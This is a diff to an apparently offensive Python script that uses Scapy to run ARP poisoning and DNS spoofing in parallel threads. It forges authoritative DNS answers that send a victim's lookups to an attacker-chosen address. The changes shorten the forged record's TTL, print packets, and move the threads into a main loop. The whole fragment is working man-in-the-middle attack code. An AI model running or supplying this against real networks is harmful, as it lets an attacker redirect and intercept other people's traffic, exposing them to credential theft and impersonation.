@@ -53,6 +53,7 @@ def dnsSniff():
 
 def packetExtract(packet):
     #If you wanted to check on the Ethernet layer for a DNS packet - type: 2048
+    packet.show()
     if packet.haslayer(DNS):
         if packet[DNS].qr == 0:
             #DNS field qr = 1 indicates it's a DNS response
@@ -62,21 +63,23 @@ def packetExtract(packet):
                         DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,\
                         #DNSRR = DNS Resource Record (vs DNQR, Question Record)
                         #Copy the DNS requests' DNS info to the response.
-                        an=DNSRR(rrname=packet[DNS].qd.qname,ttl=1660, rdata=args.dnsAddr))
+                        an=DNSRR(rrname=packet[DNS].qd.qname,ttl=10, rdata=args.dnsAddr))
             send(dnsResponse, verbose=0)
             dnsResponse.show()
 
-# def packetCheck(packet):
-#     if packet.haslayer(DNS):
-#         if packet[DNS].qr == 0:
-#             return True
-#     else:
-#         return False
-
-if __name__ == '__main__':
+def main():
     #Executes ARP poison in a separate thread
     arpThread = threading.Thread(target=arpPoison)
+    arpThread.daemon = True
     arpThread.start()
     #Spoof DNS traffic from target machine.
     dnsThread = threading.Thread(target=dnsSniff)
+    dnsThread.daemon = True
     dnsThread.start()
+    
+    # main thread
+    while True:
+    	time.sleep(1)
+
+if __name__ == '__main__':
+	main()
